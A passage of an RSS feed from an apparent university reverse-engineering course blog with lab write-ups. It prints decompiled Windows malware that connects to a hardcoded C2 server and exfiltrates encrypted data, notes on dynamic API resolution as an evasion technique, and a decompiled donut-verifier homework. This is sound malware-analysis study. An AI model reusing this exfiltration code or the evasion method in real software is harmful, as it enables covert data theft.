+0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html</guid><description>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate) Description 請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。
Background WSAStartup htons socket sockaddr WSAConnect Source Code exfiltrate :::spoiler source void __fastcall exfiltrate(PUCHAR pbInput) { __int64 s[2]; // [rsp+28h] [rbp-10h] BYREF connect_to_c2(s); send_collected_data_to_c2(s[0], pbInput); shutdown(s[0], 1); closesocket(s[0]); } ::: connect_to_c2 :::spoiler source void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, &amp;WSAData) ) { *&amp;name.sa_data[2] = 168470720; *name.sa_data = htons(0x2BB3u); name.sa_family = 2; v2 = socket(2, 1, 6); *a1 = v2; connect(v2, &amp;name, 16); } } ::: send_collected_data_to_c2 :::spoiler source void __fastcall send_collected_data_to_c2(SOCKET s, PUCHAR pbInput) { char *v4; // rbx int v5; // esi int i; // eax char v7; // al int j; // ecx int v9; // eax v4 = malloc(0x4Cui64); *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; if ( send(s, v4, 76, 0) > 0xB ) { v5 = 0; while ( v5 &lt;= 2 ) { if ( recv(s, v4, 76, 0) > 0xB &amp;&amp; *v4 == 0x11877811 ) { v9 = *(v4 + 2); if ( v9 ) { switch ( v9 ) { case 1: *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 1; encrypt_key = (v4 + 12); encrypt_data(pbInput); for ( i = 2; i &lt;= 23; ++i ) v4[i + 12] += v4[i + 11] - v4[i + 10]; break; case 2: *v4 = 0x11877811; *(v4 + 1) = 28; *(v4 + 2) = 2; memcpy_s(v4 + 12, 0x18ui64, cipher, 0x18ui64); break; case 3: goto LABEL_20; } } else { *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; } for ( j = 0; j &lt;= 39; ++j ) { v7 = v4[j + 36] + v4[43] + v4[49] - v4[67]; v4[j + 36] = v7; v4[j + 36] = v4[54] - (v4[61] + v4[69]) + v7; } send(s, v4, 76, 0); ++v5; } } LABEL_20: free(v4); } } ::: Recon connet_to_c2 目標是取得c2 server的IP和port number</description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html</guid><description>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background) Background Process Environment Block (PEB) 紀錄許多 Process 相關資訊的 OS 資料結構 存在於 user land x86 環境下，可以從 fs:[0x30] 取得 x64 環境下，可以從 gs:[0x60] 取得 ==0x18: Ldr== 指向 _PEB_LDR_DATA 結構 _PEB (注意 x64 和 x86 結構不同) _PEB_LDR_DATA 紀錄 Process 中載入模組的相關資訊 模組 module：PE 或 DLL ==0x10: InLoadOrderModuleList== 指向 _LDR_DATA_TABLE_ENTRY 依載入順序串起的雙向 linked list _PEB_LDR_DATA _LDR_DATA_TABLE_ENTRY 紀錄一個載入模組的相關資訊 ==0x00: InLoadOrderModuleList== 依載入順序串起的雙向 linked list Flink：指向下一個 entry ==0x30: DllBase== 此載入模組的 ImageBase ==0x58: BaseDllName== 此載入模組的檔案名稱 _LDR_DATA_TABLE_ENTRY Exploit Defense Evasion — Dynamic API Resolution 用途: 駭客常用的手法往往倚賴特定的 API 來達成，例如：Injection = VirtualAllocEx + WriteProcessMemory + CreateRemoteThread，因此資安產品只要監控這些 API，就很容易偵測到惡意行為 Shellcode 沒有 loader 幫你把 API 連結起來</description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html</guid><description>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業) Description 在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？ A list of all exported functions of user32.dll
Flag format: FLAG{WindowsAPIname}
Background Dynamic API Resolution Background
Recon 根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道__ROL4__的意思，根據x86 and amd64 instruction reference
The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.</description></item><item><title>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html</guid><description>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier) Source Code :::spoiler Source Code
__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] v47 = 0.0; v46 = 0.0; v42 = 0LL; memset(user_input, 0, 1024); printf("Dount Verifier\nInput: "); __isoc99_scanf("%1023s", user_input); printf("\x1B[2J"); // 這個意思是清除整個頁面 for ( i = 0LL; i &lt;= 499; ++i ) { memset(s, 32, sizeof(s)); memset(v20, 0, sizeof(v20)); for ( j = 0.0; j &lt; 6.28; j = v14 ) { v40 = 0; for ( k = 0.0; k &lt; 6.28; k = v13 ) { v3 = _mm_cvtsi32_si128(LODWORD(k)); *v3.m128i_i64 = (compute_sinf)(*v3.m128i_i64);// 計算浮點數的正弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/sin-sinf-sinl?view=msvc-170 v37 = COERCE_FLOAT(_mm_cvtsi128_si32(v3)); v4 = _mm_cvtsi32_si128(LODWORD(j)); *v4.m128i_i64 = (compute_conf)(*v4.m128i_i64);// 計算餘弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/cos-cosf-cosl?view=msvc-170 v36 = COERCE_FLOAT(_mm_cvtsi128_si32(v4)); v5 = _mm_cvtsi32_si128(LODWORD(v47)); *v5.m128i_i64 = (compute_sinf)(*v5.m128i_i64); v35 = COERCE_FLOAT(_mm_cvtsi128_si32(v5)); v6 = _mm_cvtsi32_si128(LODWORD(j)); *v6.m128i_i64 = (compute_sinf)(*v6.m128i_i64); v34 = COERCE_FLOAT(_mm_cvtsi128_si32(v6)); v7 = _mm_cvtsi32_si128(LODWORD(v47)); *v7.m128i_i64 = (compute_conf)(*v7.m128i_i64); v33 = COERCE_FLOAT(_mm_cvtsi128_si32(v7)); v32 = v36 + 2.0; v31 = 1.0 / ((((v37 * (v36 + 2.0)) * v35) + (v34 * v33)) + 5.0); v8 = _mm_cvtsi32_si128(LODWORD(k)); *v8.m128i_i64 = (compute_conf)(*v8.m128i_i64); v30 = COERCE_FLOAT(_mm_cvtsi128_si32(v8)); v9 = _mm_cvtsi32_si128(LODWORD(v46)); *v9.m128i_i64 = (compute_conf)(*v9.m128i_i64); v29 = COERCE_FLOAT(_mm_cvtsi128_si32(v9)); v10 = _mm_cvtsi32_si128(LODWORD(v46)); *v10.m128i_i64 = (compute_sinf)(*v10.m128i_i64); v28 = COERCE_FLOAT(_mm_cvtsi128_si32(v10)); v27 = ((v37 * v32) * v33) - (v34 * v35); v26 = (((v31 * 30.0) * (((v30 * v32) * v29) - (v27 * v28))) + 40.0); v25 = (((v31 * 15.0) * ((v27 * v29) + ((v30 * v32) * v28))) + 12.0); v24 = 80 * v25 + v26; v23 = (8.0 * ((((((v34 * v35) - ((v37 * v36) * v33)) * v29) - ((v37 * v36) * v35)) - (v34 * v33)) - ((v30 * v36) * v28))); if ( v25 &lt;= 21 &amp;&amp; v25 > 0 &amp;&amp; v26 > 0 &amp;&amp; v26 &lt;= 79 &amp;&amp; v31 > v20[v24] ) { v20[v24] = v31; v11 = v23; if ( v23 &lt; 0 ) v11 = 0; s[v24] = special_char[v11]; // special_char就是印出甜甜圈的素材 } if ( v40 == 30 &amp;&amp; v42 &lt;= 0x3FF ) { v22 = v24 ^ v23 ^ (v26 + v25); v12 = v42++; *(user_input + v12) ^= v24 ^ v23 ^ (v26 + v25); } ++v40; v13 = k + 0.02; } v14 = j + 0.07000000000000001; } printf("\x1B[H"); // 這個代表游標回到home position for ( idx = 0; idx &lt;= 0x6E0; ++idx ) // 這一段for loop就是在印出甜甜圈 { if ( idx % 80 ) v15 = s[idx]; else v15 = 10; putchar(v15); v16 = v47 + 0.00004; v47 = v16; v17 = v46 + 0.00002; v46 = v17; } usleep(30000u); // 睡眠0.03秒 } cipher_1 = verification(user_input, 0x400uLL); cipher_2 = verification(key, 0x400uLL); if ( cipher_1 == cipher_2 ) puts("Donut likes your input!! :D"); else puts("Donut Reject You!! :("); puts("No matter donut accept you or not. Here's a bananacat for you"); puts(icon); puts(&amp;icon[112]); puts(&amp;icon[232]); puts(&amp;icon[352]); puts(&amp;icon[480]); puts(&amp;icon[600]); puts(&amp;icon[728]); puts(&amp;icon[856]); puts(&amp;icon[992]); puts(&amp;icon[1128]); puts(&amp;icon[1272]); puts(" ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ \x00\x00 ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \x00\x00\x00\x00\x00\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \x00\x00\x00\x00\x00\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ 